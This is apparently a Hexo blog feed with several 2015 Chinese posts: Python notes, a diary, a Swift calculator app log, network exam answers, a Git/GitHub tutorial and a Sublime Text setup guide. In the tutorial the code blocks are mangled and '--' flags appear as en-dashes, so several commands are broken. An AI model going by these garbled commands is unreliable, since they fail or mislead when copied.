</p><ul><li><code>x=input()</code>然后<code>type(x)</code>出来会是<code>&lt;class &#39;str&#39;&gt;</code> 也可能是<code>&lt;class &#39;int&#39;&gt;</code>，swift也是这样自动预测的optional。</li><li>每一行都是一条命令，缩进使用<code>:</code>符号，之后的句子用四个空格开头，表示缩进 </li><li><code>if(1&gt;0):</code>然后<code>ctrl+↩︎</code>可以实现在命令行交互环境中换行，后面随便写一句<code>print(&#39;yeah&#39;)</code>可以正常输出</li><li>python是大小写敏感的</li></ul>]]></content>
      
      
      <categories>
          
          <category> 硬悟学蛇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> howto </tag>
            
            <tag> abc </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>这几天都干了啥</title>
      <link href="/2015/09-24-%E8%BF%99%E5%87%A0%E5%A4%A9%E9%83%BD%E5%B9%B2%E4%BA%86%E5%95%A5/"/>
      <url>/2015/09-24-%E8%BF%99%E5%87%A0%E5%A4%A9%E9%83%BD%E5%B9%B2%E4%BA%86%E5%95%A5/</url>
      
        <content type="html"><![CDATA[<p>这几天都更新了的，全部在这一篇里面👉<a href="http://gaoryrt.github.io/2015/09/21/一个calcu-app的实现/" target="_blank" rel="noopener">一个calcu app的实现</a><br>基本上都在写这个程序员计算器了<br><a id="more"></a> </p><h1 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h1><p>写计算器刚开始还觉得简单用不了多久<br>但是写着写着功能一多bug就多得不得了<br>最开始设定的功能都还没有写完这边bug都爆炸了，今晚直接浪费1h在debug上面。。<br>最后发现出错的地方很傻逼。。自己把带参的函数形参都写掉了<br>然后学乖了。。没有的功能直接在不用的时候禁用掉，不准bug出来。。<br>希望越大失望越大。。还好已经习惯了，尽量要求自己不要把最初的目标打破<br>结果保持最初目标不变成了最低标准。。真伤心  </p><hr><h1 id="大江大海"><a href="#大江大海" class="headerlink" title="大江大海"></a>大江大海</h1><p>上次是哪里看到大江大海1949来着。。。<br>对了就是D版<br>有人说看到部分情节虐心<br>我就喜欢虐心的。。然后就找来看了<br>龙应台讲他爸妈和爸妈的朋友亲戚的故事<br>讲故事的时候总感觉她不是亲生的。。咋个语气那么冷淡<br>后面越来越感觉这样第三者来看明显不矫情啊<br>社会动荡 沧海桑田 个人在革命面前的渺小一下子就出来了。。<br>确实挺好看的，还没有看完  </p><hr><h1 id="一个人"><a href="#一个人" class="headerlink" title="一个人"></a>一个人</h1><p>猫科每周五中午去找女友，周二中午才回来<br>刚看到的时候我多羡慕，真的多羡慕<br>后来在各种地方接收到的信息都告诉我，我还是喜欢一个人的感觉<br>至少现在阶段是这样的。。<br>现在最完美的场景是什么呢，容我畅想一下。。<br>就是没有人打扰然后可以安安心心写代码。。。<br>真心觉得这样的感觉多好的<br>可能有些人加班的时候就是带着这样的心情<br>冥冥当中有个声音告诉你这样劳神费力－冥冥当中又有种舒适的感觉<br>我肯定有毛病  反正现在打字的时候已经 上午12:03 但是为什么我挺享受这个瞬间呢。。<br>带着耳机没人打扰吧，而且我的桌面我自己觉得挺好看。。</p><hr><p>以上</p>]]></content>
      
      
      <categories>
          
          <category> 随笔与个人文集 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>一个Calcu App的实现</title>
      <link href="/2015/09-21-%E4%B8%80%E4%B8%AAcalcu-app%E7%9A%84%E5%AE%9E%E7%8E%B0/"/>
      <url>/2015/09-21-%E4%B8%80%E4%B8%AAcalcu-app%E7%9A%84%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>突然又想写代码了，于是今天<strong>心血来潮</strong>想做一个类似于win7上面计算器（程序员版）的app<br>我果手机的科学计算器并没有这个功能，在我专业某些时候使用还是挺无力的，不如自己写一个，也花不了几天<br><a href="https://github.com/gaoryrt/calcu" target="_blank" rel="noopener">calcu的github</a><br><a id="more"></a><br>主界面差不多就这样：<img src="http://ww4.sinaimg.cn/large/a243ad6cjw1ewahgtk8v5j20g3099aaa.jpg" alt="主界面"></p><h1 id="界面"><a href="#界面" class="headerlink" title="界面"></a>界面</h1><p>功能看图，写得很明白了<br>Hex Dec Oct Bin就是十六进制，十进制，八进制，二进制<br>然后是循环左移循环右移，或运算异或运算，左移右移，非运算和运算<br>然后是0～F数字<br>再往右是加减乘除<br>然后是clean，backspace，求余数，等于  </p><hr><h1 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h1><p>上面写道的功能都有<br>然后就是在1024上面留64个二进制位，跟windows上面程序员的用途一样<br>并没有往里添加小数点，这个是因为windows的那个版本没有小数点  </p><blockquote><p>windows版本有左右括号，我暂时没有思路就没有做<br>另外就是＋－符号没有添加，这个的话，手动也不难  </p></blockquote><hr><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>暂时把写了一半的代码放下面<br>我实在是有点晕了，现在（2015年9月21日下午11:30）的思路跟上午开始时的思路不一样了<br>说明做事情要善始善终，不然就白费好多功夫   </p><hr><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><ol><li>输入一个数，按了加减乘除之后存成数据到temp（num1）里面，还要用一个字符串存这时候的运算符ope   </li><li>再输入一个数，再按加减乘除的话，通过temp、这个数、ope计算出值，放在resul位置，然后把刚才resul的位置上的数覆盖在temp上面，这样点击等号的话可以继续计算  </li><li>还有不知道怎么实现在二进制的时候其他数字按钮不可选中，选中二进制的时候该按钮高亮</li><li>十六进制的ABCDEF怎么转化为10进制这个问题暂时没有开始想  </li><li>左移右移这个也是问题</li></ol><hr><h1 id="不要说我鸽"><a href="#不要说我鸽" class="headerlink" title="//不要说我鸽"></a>//不要说我鸽</h1><p>这个肯定写得完，只可惜明天从天亮上课上到天黑～<br>那么就把思路要点先放在这里，等明儿晚上继续</p><hr><h1 id="2015年9月23日上午12-02-继续"><a href="#2015年9月23日上午12-02-继续" class="headerlink" title="2015年9月23日上午12:02 继续"></a>2015年9月23日上午12:02 继续</h1><p>今天重新开始了 把思路缕了一缕<br>从算法设计开始重新来</p><hr><h1 id="2015年9月23日上午1-59-update"><a href="#2015年9月23日上午1-59-update" class="headerlink" title="2015年9月23日上午1:59 update"></a>2015年9月23日上午1:59 update</h1><p> 十进制功能完成了</p><hr><h2 id="进制转换功能完成"><a href="#进制转换功能完成" class="headerlink" title="进制转换功能完成"></a>进制转换功能完成</h2><p>本来想放代码的，想想算了，把以前的都给删除了  </p><blockquote><p>//方法1: 定义一个变量表示原进制，另一个Int表示目的进制，原进制2，8，10，16进制用数字0，1，2，3表示；目的进制用1，5，9，13表示<br>    //      进行进制转换调用一转换函数，函数通过原进制和目的进制变量的和得知（4*4-4）中的一种转换   需要写12种转换方式<br>    //方法2: swift里面吧所有的0x 0o 0b全部以十进制存储<br>    //      在输入的时候，实时将String转换为Int  专为十进制的时候只用一个方法，转出方法（短除法）也只有一中<br>    //      需要一个temp放十进制的数，每次进制转换都从temp来转<br>    //      可以用resultLabel0直接接短除法的输出的，但是resultLabel0会在用户面前变化，为了避免这种情况发生，需要一个String来记录输出<br>    //      用一个变量告诉转入十进制方法原进制，告诉转出方法目的进制</p></blockquote><p>然后采用了第二种方式，不同进制的运算都转换到十进制，突然感觉第一种转换还有点困难啊。。。</p><h2 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h2><ol><li>在非十进制的情况下点击opeButton/eqaButton的时候会闪退  </li><li>backspace没有设置  </li><li>Or Xor Not And 没有设置  </li><li>输入太多了就退出了，重要的是我也不知道为何<br>不祥的预感   是不是要重写计算按钮  </li></ol><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><ol><li>非十进制下不能进行其他操作 ＝。＝别怪我</li></ol><hr><h1 id="2015年9月24日-睡前更新"><a href="#2015年9月24日-睡前更新" class="headerlink" title="2015年9月24日 睡前更新"></a>2015年9月24日 睡前更新</h1><p>遇见个特傻逼的问题还debug了半天<br>结果就是我为了调用一个含参的Action(sender: AnyObject)<br>把中间的sender: AnyObject给删除了<br>于是AppDelegate: UIResponder, UIApplicationDelegate就爆炸了<br>找了半天，把github上昨晚版本都clone下来了。。。  </p><h2 id="更新内容有："><a href="#更新内容有：" class="headerlink" title="更新内容有："></a>更新内容有：</h2><ol><li>向十进制和二进制分别制定了可操作按钮，完全不给特殊情况机会。。。主要是懒难得debug了  </li><li>backspace键完成了  </li><li>在现实区域上面添加了位数的指示，就是在storyboard上加了几个label而已。。</li></ol><h2 id="还需要完成："><a href="#还需要完成：" class="headerlink" title="还需要完成："></a>还需要完成：</h2><ol><li>最上面还要一行／多行    用于or xor not and操作的可视化，毕竟自己都不知道怎么做  </li><li>ui改进  这个等最后来吧  </li><li>左右挺进／循环挺进  </li><li>位数限制，避免内存太大。。<br><strong><em>结尾打卡</em></strong>2015年9月24日下午11:32</li></ol><hr><h1 id="2015年9月25日下午3-36"><a href="#2015年9月25日下午3-36" class="headerlink" title="2015年9月25日下午3:36"></a>2015年9月25日下午3:36</h1><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><ol><li>左右挺进／循环挺进</li></ol><h2 id="问题-2"><a href="#问题-2" class="headerlink" title="问题"></a>问题</h2><ol><li>二进制超过12位，瞬间爆炸</li><li>其他进制同理，等着最后debug或添加约束  </li><li>代码的简化，多个action可以用if精简到一起</li><li>10（123）＋ bin 直接出来。。</li></ol><hr><h1 id="2015年9月26日上午2-13-停止更新"><a href="#2015年9月26日上午2-13-停止更新" class="headerlink" title="2015年9月26日上午2:13 停止更新"></a>2015年9月26日上午2:13 <del>停止更新</del></h1><p>有其他更重要的事情做，停止更新<br>四个逻辑按钮功能已经写出来，可以在git上看到主代码<br>没有debug，其他功能可用  </p><p>可能是兴趣到此为止了<br>开始的时候着急了 规划出了问题<br>应该想清楚功能分区的<br>现在好几个地方都混在一起了 改都不好改 莫名其妙跳到Hex上面<br>不写了 宁愿重写个逻辑运算器都不在这上面改了  </p><hr><p>以上</p>]]></content>
      
      
      <categories>
          
          <category> 麦客爱苹果 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> swift </tag>
            
            <tag> app </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>计算机网络复习资料</title>
      <link href="/2015/09-18-%E5%A4%8D%E4%B9%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
      <url>/2015/09-18-%E5%A4%8D%E4%B9%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
      
        <content type="html"><![CDATA[<p>复习计算机网络就是看书，把五层结构看完就差不多了<br>用mindnode做了个脑图，png在下面，附上百度网盘下载链接<br><a id="more"></a></p><h1 id="脑图以及下载"><a href="#脑图以及下载" class="headerlink" title="脑图以及下载"></a>脑图以及下载</h1><p><img src="http://ww4.sinaimg.cn/large/a243ad6cjw1ew6yidywq2j219q6noqv6.jpg" alt="脑图"><br><a href="http://pan.baidu.com/s/1o6zPGLW" target="_blank" rel="noopener">图片.png下载 密码: cr7p</a><br><a href="http://pan.baidu.com/s/1gdpoDur" target="_blank" rel="noopener">脑图.mindnode 密码: 6xr6 这个直接解压就可以用mindnode打开</a><br>所有协议都明白什么意思后就轻松做选填了  </p><hr><h1 id="大题"><a href="#大题" class="headerlink" title="大题"></a>大题</h1><p>我院的计算题就只有以下几个类型，要是有其他类型的大题，绝壁是大的简答题  </p><p><strong>已知某有噪信道的信噪比为30DB，带宽为3KHZ，求该信道的最大数据传输速率</strong></p><blockquote><p>这个与香农定理有关.即,信道容量(速率)与噪声和带宽有关<br>设信噪比为S/N,信道最大速率为C,带宽为B<br>则有公式:C=Blog2(1+S/N)[以2为底,1+S/N的对数]<br>带如你的 数值可得<br>C=3000log2(1+1000)=29900比特每秒<br>30DB对应的数值就是1000  </p></blockquote><p><strong>一网络采用距离向量路由由算法进行路由选择,假如路由选择C在启动时，测得与相邻路由器A、B的时延分别是7、14。此后，路由器C分别收到来自相邻路由B和A发出的路由向量 B（15，0，4，6）、A（0，3，12，16）。上述向量表示发送该向量的路由器分别与网络中路由器A、B、C、D之间的时延。计算路由器C在收到相邻路由器发出的向量后，更新后的路由表</strong><br>（图略，自己画脑补）  </p><blockquote><p>收到路由向量A（0，3，12，16）B（15，0，4，6）<br>C更新后的路由表（分别到A,B,C,D的路由向量）<br>（7，A），（10，A），（0,-），（20，B）  </p></blockquote><p><strong>一个大公司有一个总部和三个下属部门。公司分配到的网络前缀是192.77.33/24.公司的网络布局如图4-56示。总部共有五个局域网，其中的LAN1-LAN4都连接到路由器R1上，R1再通过LAN5与路由器R5相连。R5和远地的三个部门的局域网LAN6～LAN8通过广域网相连。每一个局域网旁边标明的数字是局域网上的主机数。试给每一个局域网分配一个合适的网络前缀</strong><br>这道题是第六版计算机网络上P185的原题4-30  </p><blockquote><p>解答直接看书后面的解答P424  </p></blockquote><p><strong>有一个电缆长度为1Km的CSMA/CD局域网，数据传输速率为1Gbps，信号传播速度为2×105Km/s。试求出最小帧长度</strong>  </p><blockquote><p>帧长度L=S*2D/V<br>(1/2X10^5)X2  </p></blockquote><p><strong>一个IP分组，数据部分长度为8192字节，欲通过MTU=1500的局域网，如何分片？给出每个分片长度及片偏移。</strong></p><blockquote><p>标准IP头部20字节，MTU=1500，数据长度最多1480字节<br>第1个包：IP头20，数据1480，偏移量0 MF=1<br>第2个包，IP头20，数据1480，偏移185 MF=1<br>第3个包，IP头20，数据1480，偏移370 MF=1<br>第4个包，IP头20，数据1480，偏移555 MF=1<br>第5个包，IP头20，数据1480，偏移740 MF=1<br>第6个包，IP头20，数据792， 偏移839  MF=0  </p></blockquote><hr><h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><p>一定要看完书再看他妈的题啊，协议太多了，精髓就全在各种简写的英文字母里面了<br>看完书再做题，看不懂选填也是正常的，过了那个坎自然就看懂了，跟他妈快恢复一样的<br>求你至少看完老师勾的五层结构重点，大题就那么几种，全是送分的，难就难在前面选填和简答题上面</p><p><strong>2015年9月18日</strong>今天考完了，成绩还不晓得，劳资要是没有过我就去抄书，反正也是必备知识  </p><p>以上</p>]]></content>
      
      
      <categories>
          
          <category> Discovery </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>开始使用Github</title>
      <link href="/2015/09-14-%E6%80%8E%E4%B9%88%E4%BD%BF%E7%94%A8github/"/>
      <url>/2015/09-14-%E6%80%8E%E4%B9%88%E4%BD%BF%E7%94%A8github/</url>
      
        <content type="html"><![CDATA[<p>我自己也是刚开始使用github没几天，写得不好<br>我就写自己常用的吧  </p><blockquote><p>2015年9月20日下午3:19更新<br>知乎上这个答案写得好多了👉<a href="http://www.zhihu.com/question/20070065" target="_blank" rel="noopener">天猪(刘勇)的答案</a><br>请跪着看  </p></blockquote><a id="more"></a>  <hr><h1 id="什么是Github／Git-？"><a href="#什么是Github／Git-？" class="headerlink" title="什么是Github／Git ？"></a>什么是Github／Git ？</h1><h2 id="什么是Git"><a href="#什么是Git" class="headerlink" title="什么是Git"></a>什么是Git</h2><p>一个分布式版本控制<strong>系统</strong><br>主要功能感觉跟Time Machine差不多，可以保存同一个文件在不同时间的不同修改版本，可以简单的还原到某一时间点<br>然后，如果有人愿意跟你一起开发同一个文档，也可以共享过去同时编辑<br>或者开启另一个分支，从某一个版本开始制作另外一个文件<br>分布式感觉跟peer to peer的感念差不多，每一个编辑文档的设备都可以当作另一个设备的服务器，这种东西在没有互联网或者是某一台设备坏掉的时候就显示出优点来了<br>每一次修改都可以记录修改的注释，然后可以自动准确的找出不同点<br><strong>这个Git的创造者Linus同时也是Linux的创造者</strong>  </p><h2 id="什么是Github-？"><a href="#什么是Github-？" class="headerlink" title="什么是Github ？"></a>什么是Github ？</h2><blockquote><p>Github是全球最大的同性交友平台。 (大雾)</p></blockquote><p>Github是一个使用Git作为版本控制系统的<strong>托管平台</strong><br>Github（托管，集中）＋Git（对等，分布）就同时互补具有了很多优点<br>Git（貌似）没有图形化客户端，在Github在web端就可以图形化管理</p><hr><h1 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h1><p>在我的这一篇文章👉<a href="http://gaoryrt.github.io/2015/09/09/howto/" target="_blank" rel="noopener">这个博客建立的流程</a>提到过了  </p><blockquote><p>在<a href="http://git-scm.com" target="_blank" rel="noopener">Git官网</a>可以下载到安装包<br><strong>或者</strong>使用<a href="http://mxcl.github.com/homebrew/" target="_blank" rel="noopener">Homebrew</a>，<a href="http://www.macports.org/" target="_blank" rel="noopener">MacPorts</a>进行安装<br>安装成功后可使用git命令<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ git --version</span><br><span class="line">```  </span><br><span class="line">如果安装成功返回的是git的版本信息  </span><br><span class="line"></span><br><span class="line">要是使用的是Mac，貌似Xcode就自带Git  </span><br><span class="line">找找Xcode-&gt;Preference-&gt;Download里面的`Command Line Tools`安装／更新好了就可以在`terminal.app`里面使用git命令了  </span><br><span class="line"></span><br><span class="line">使用terminal，定位到你想安装git的文件夹下，使用这个命令：</span><br></pre></td></tr></table></figure></p></blockquote><p>$ git init<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">然后就安装好了，这个文件夹就是你的git仓库  </span><br><span class="line">以后需要使用git管理的文件都要放在这个文件夹（或者子文件夹）里面  </span><br><span class="line"></span><br><span class="line">***  </span><br><span class="line"># 使用Git  </span><br><span class="line">*这里指的git使用仅限于本地*  </span><br><span class="line">添加文件使用`add`命令，提交则是`commit`命令  </span><br><span class="line">比如我要把一个`HelloWorld.c`提交到git 仓库</span><br><span class="line">先把这个文件放在git的主文件夹中，然后定位到这个文件所在的文件夹使用</span><br></pre></td></tr></table></figure></p><p>$ git add HelloWorld.c<br>$ git commit</p><pre><code>就行了  Git的使用和Github使用有重复的，请继续往下看Github的使用常用命令看这里👉[知乎问题 git？](http://www.zhihu.com/question/31246445)  ***  # 使用Github  &gt;就是一网站哎呀自己看说明我要玩MC去了  &gt;坑挖在这里等着填 2015年9月14日 下午9:14  2015年9月20日下午3:30 填坑  看了一些网页发现github起步实在是太困难了  在这里只能给大家，（主要是给自己）指一些方向  等看完了才能总结，总结完了才能写  不知不觉坑就挖好了  &lt;!--more--&gt;  ***  ##  在[Github](https://github.com)上注册和登录    *下面部分来自[官网help文档](https://help.github.com/articles/set-up-git/)的翻译*  1.[下载并安装git](http://git-scm.com/downloads)  2.打开 ``Terminal.app``  3.告诉git你的名字，Type everything after the ``$`` here:  </code></pre><p>  $ git config –global user.name “YOUR NAME”</p><pre><code>4.告诉git你的email地址，这里输入的地址必须和你在注册Github时使用的相同， 如果你想隐藏你的email地址，请参考[&quot;Keeping your email address private&quot;](https://help.github.com/articles/keeping-your-email-address-private)。  </code></pre><p>$ git config –global user.email “YOUR EMAIL ADDRESS”  </p><pre><code>***## 下一步：在Git上关联Github  当你在Git上连接了一个Github知识库，你需要使用HTTPS或者SSH与Github关联  ### 使用HTTPS关联(推荐)  &gt;克隆HTTPS链接对每一个知识库都有效，你可以得到一个只读或者读写的地址，取决于它公开与否，以及你的允许。&gt;链接在哪里都有效，即使你在墙后或者使用了代理，在某些情况下，如果你选择SSH，你只能[使用SSH的部分](https://help.github.com/articles/using-ssh-over-the-https-port)。&gt;当你通过HTTPS在git上使用`git fetch`、`git pull`、`git push`、`git remote`命令时，你会被要求输入Github的用户名以及密码。&gt;如果你使用了[两个身份的验证](https://help.github.com/articles/about-two-factor-authentication)，你必须[创建一个身份地址令牌](https://help.github.com/articles/creating-an-access-token-for-command-line-use)来使用Github，而非你的Github密码。你可以使用[验证助手](https://help.github.com/articles/caching-your-github-password-in-git)，这样你就不用每次登陆都输入密码了。### 在git上缓存你的Github密码  你需要确定你的Git是1.7.10版本及以上  如果你是通过[homebrew](http://brew.sh/)安装的git，那么你已经装好了OSXkeychain helper  下面是安装方法  &gt;1.确定你的计算机上是否已经安装了OSXkeychain helper，尝试以下命令：</code></pre><p>$ git credential-osxkeychain  </p><h1 id="如果已经安装的话返回如下"><a href="#如果已经安装的话返回如下" class="headerlink" title="如果已经安装的话返回如下"></a>如果已经安装的话返回如下</h1><h1 id="Usage-git-credential-osxkeychain-lt-get-store-erase-gt"><a href="#Usage-git-credential-osxkeychain-lt-get-store-erase-gt" class="headerlink" title="Usage: git credential-osxkeychain &lt;get|store|erase&gt;"></a>Usage: git credential-osxkeychain &lt;get|store|erase&gt;</h1><pre><code>2.如果OSXkeychain helper尚未安装，使用以下命令通过curl安装：</code></pre><p>$ git credential-osxkeychain</p><h1 id="如果没有安装的话返回如下"><a href="#如果没有安装的话返回如下" class="headerlink" title="如果没有安装的话返回如下"></a>如果没有安装的话返回如下</h1><h1 id="git-‘credential-osxkeychain’-is-not-a-git-command-See-‘git-–help’"><a href="#git-‘credential-osxkeychain’-is-not-a-git-command-See-‘git-–help’" class="headerlink" title="git: ‘credential-osxkeychain’ is not a git command. See ‘git –help’."></a>git: ‘credential-osxkeychain’ is not a git command. See ‘git –help’.</h1><pre><code>继续  </code></pre><p>$ curl -s -O \<br><a href="https://github-media-downloads.s3.amazonaws.com/osx/git-credential-osxkeychain" target="_blank" rel="noopener">https://github-media-downloads.s3.amazonaws.com/osx/git-credential-osxkeychain</a></p><h1 id="这就开始下载了"><a href="#这就开始下载了" class="headerlink" title="这就开始下载了"></a>这就开始下载了</h1><pre><code>然后</code></pre><p>$ chmod u+x git-credential-osxkeychain</p><h1 id="Fix-the-permissions-on-the-file-so-it-can-be-run"><a href="#Fix-the-permissions-on-the-file-so-it-can-be-run" class="headerlink" title="Fix the permissions on the file so it can be run"></a>Fix the permissions on the file so it can be run</h1><pre><code>3.将OSXkeychain helper和git安装到同一个文件夹：  </code></pre><p>$ sudo mv git-credential-osxkeychain \<br>“$(dirname $(which git))/git-credential-osxkeychain”</p><h1 id="Move-the-helper-to-the-path-where-git-is-installed"><a href="#Move-the-helper-to-the-path-where-git-is-installed" class="headerlink" title="Move the helper to the path where git is installed"></a>Move the helper to the path where git is installed</h1><h1 id="Password-enter-your-password"><a href="#Password-enter-your-password" class="headerlink" title="Password: [enter your password]"></a>Password: [enter your password]</h1><pre><code>4.告诉git使用`credential.helper`来进行全局配置：  </code></pre><p>$ git config –global credential.helper osxkeychain</p><h1 id="Set-git-to-use-the-osxkeychain-credential-helper"><a href="#Set-git-to-use-the-osxkeychain-credential-helper" class="headerlink" title="Set git to use the osxkeychain credential helper"></a>Set git to use the osxkeychain credential helper</h1><pre><code>下一次你使用HTTPS url进行克隆的时候就会开启OSXkeychain helper缓存了，然后你再使用的时候就不会再要求你输入用户名及密码了。***  *以下来自于网站 [git简明指南](http://rogerdudler.github.io/git-guide/index.zh.html)*# 获得一个知识库(repository)  使用以下命令以获得一个远端服务器上的知识库版本：  </code></pre><p>$ git clone username@host:/path/to/repository  </p><pre><code># 工作流  你的本地仓库由 git 维护的三棵“树”组成。第一个是你的 **工作目录**，它持有实际文件；第二个是 **暂存区（Index）**，它像个缓存区域，临时保存你的改动；最后是 **HEAD**，它指向你最后一次提交的结果。  ## 添加和提交  你可以提出更改（把它们添加到**暂存区(index)**），使用如下命令：  </code></pre><p>git add <filename><br>git add *  </filename></p><pre><code>这是 git 基本工作流程的第一步；  使用如下命令以实际提交改动：</code></pre><p>git commit -m “代码提交信息”  </p><pre><code>现在，你的改动已经提交到了 **HEAD**，但是还没到你的远端仓库。  ## 推送  你的改动现在已经在本地仓库的 HEAD 中了。执行如下命令以将这些改动提交到远端仓库：</code></pre><p>git push origin master  </p><pre><code>可以把 master 换成你想要推送的任何分支。   如果你还没有克隆现有仓库，并欲将你的仓库连接到某个远程服务器，你可以使用如下命令添加：</code></pre><p>git remote add origin <server>  </server></p><pre><code>如此你就能够将你的改动推送到所添加的服务器上去了。  #  分支  分支是用来将特性开发绝缘开来的。  在你创建仓库的时候，master 是“默认的”分支。  在其他分支上进行开发，完成后再将它们合并到主分支上。  创建一个叫做“feature_x”的分支，并切换过去：  </code></pre><p>git checkout -b feature_x  </p><pre><code>切换回主分支：  </code></pre><p>git checkout master  </p><pre><code>再把新建的分支删掉：   </code></pre><p>git branch -d feature_x  </p><pre><code>除非你将分支推送到远端仓库，不然该分支就是 不为他人所见的：  </code></pre><p>git push origin <branch>  </branch></p><pre><code># 更新与合并  要更新你的本地仓库至最新改动，执行：  </code></pre><p>git pull  </p><pre><code>以在你的工作目录中 获取（fetch） 并 合并（merge） 远端的改动。要合并其他分支到你的当前分支（例如 master），执行：</code></pre><p>git merge <branch></branch></p><pre><code>在这两种情况下，git 都会尝试去自动合并改动。遗憾的是，这可能并非每次都成功，并可能出现冲突（conflicts）。   这时候就需要你修改这些文件来手动合并这些冲突（conflicts）。改完之后，你需要执行如下命令以将它们标记为合并成功：</code></pre><p>git add <filename></filename></p><pre><code>在合并改动之前，你可以使用如下命令预览差异：</code></pre><p>git diff &lt;source_branch&gt; &lt;target_branch&gt;</p><pre><code># 替换本地改动  假如你操作失误（当然，这最好永远不要发生），你可以使用如下命令替换掉本地改动：</code></pre><p>git checkout – <filename></filename></p><pre><code>此命令会使用 HEAD 中的最新内容替换掉你的工作目录中的文件。已添加到暂存区的改动以及新文件都不会受到影响。  假如你想丢弃你在本地的所有改动与提交，可以到服务器上获取最新的版本历史，并将你本地主分支指向它：</code></pre><p>git fetch origin<br>git reset –hard origin/master<br><code>`</code>  </p><hr><p>以上</p>]]></content>
      
      
      <categories>
          
          <category> Geek Talks · 奇客怪谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> howto </tag>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>使用Markdown须知</title>
      <link href="/2015/09-10-%E5%85%B3%E4%BA%8Emarkdown/"/>
      <url>/2015/09-10-%E5%85%B3%E4%BA%8Emarkdown/</url>
      
        <content type="html"><![CDATA[<p>好好的一个学计算机的居然不知道Markdown？<br>虽然我也才开始没多久，反正开了这个博客之后发现Markdown＋Mou的组合很方便<br>Markdown貌似就是针对网络文本显示开发的吧，语法类似HTML<br>P.S. 后缀名是<code>.md</code><br><a id="more"></a></p><hr><h1 id="科普Markdown是一个大坑"><a href="#科普Markdown是一个大坑" class="headerlink" title="科普Markdown是一个大坑"></a>科普Markdown是一个大坑</h1><p>直接上链接，你想要的全都有，我也不忍直接抄袭，主要是因为懒。<br><a href="http://www.markdown.cn/#acknowledgement" target="_blank" rel="noopener">Markdown中文网</a><br><a href="http://daringfireball.net/projects/markdown/syntax" target="_blank" rel="noopener">上面那个链接的英文版</a>至于为什么会有英文版。。。<br>写的真的很好了<br>我也要先去学习了，才知道可以使用<code>ctl + shift + L</code>添加链接，以前一直来回切输入法<br>我也才知道Markdown可以使用<code>|</code>和<code>-</code>来制作表格，然而Hexo不支持  </p><hr><h1 id="Mou支持的快捷键"><a href="#Mou支持的快捷键" class="headerlink" title="Mou支持的快捷键"></a>Mou支持的快捷键</h1><p>粗体 － Bold － <code>cmd ＋ B</code><br>斜体 － Emphasize － <code>cmd ＋ I</code><br>行间代码区 － Inline Code － <code>cmd ＋ K</code><br>链接 － Link － <code>ctl ＋ shift ＋ L</code><br>图片 － Picture － <code>ctl ＋ shift ＋ I</code><br>提行 － New Line － <code>shift ＋ return</code><br>评注 － Comment － <code>cmd ＋ ／</code>  </p><hr><p><strong>这总不算烂尾了吧？</strong></p>]]></content>
      
      
      <categories>
          
          <category> Geek Talks · 奇客怪谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> markdown </tag>
            
            <tag> mou </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>开始使用Sublime Text 3</title>
      <link href="/2015/09-10-%E5%BC%80%E5%A7%8B%E4%BD%BF%E7%94%A8sublime-text-3/"/>
      <url>/2015/09-10-%E5%BC%80%E5%A7%8B%E4%BD%BF%E7%94%A8sublime-text-3/</url>
      
        <content type="html"><![CDATA[<p>windows上面基本上是个文件都可以用notepad++打开<br>在我遇见sublime text之前我都是使用<code>文本编辑.app</code> 来打开的<br>但是好像并不能打开Hexo的配置文件<code>_config.yml</code><br>然后就开始使用sublime text了<br><a id="more"></a>  </p><hr><h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p>很容易就可以在网络上找到sublime text 2/sublime text 3的安装包<br>好像还有破解版，但是看人家说的貌似这个可以无限免费试用<br>也就是说正式版就只是向作者donate而已<br>那就用着试用版吧<br>下载链接👉 <a href="http://www.sublimetext.com" target="_blank" rel="noopener">sublime text</a>  </p><hr><h1 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h1><h2 id="Package-Control"><a href="#Package-Control" class="headerlink" title="Package Control"></a>Package Control</h2><p>同众多的编辑器一样，sublime text一样有一大批插件可供使用<br>安装插件最方便的方法就是使用Package Control了<br>右边链接介绍了安装方法–&gt;<a href="https://packagecontrol.io/installation#Simple" target="_blank" rel="noopener">Installation - Package Control</a>   </p><blockquote><p>简单来说就是<br>点开<code>View &gt; Show Console</code>或者快捷键<code>ctrl+`</code>进入console<br>sublime text 3 输入以下命令然后回车  </p><pre><code>import urllib.request,os,hashlib; h = &apos;eb2297e1a458f27d836c04bb0cbaf282&apos; + &apos;d0e7a3098092775ccb37ca9d6b2e4b7d&apos;; pf = &apos;Package Control.sublime-package&apos;; ipp = 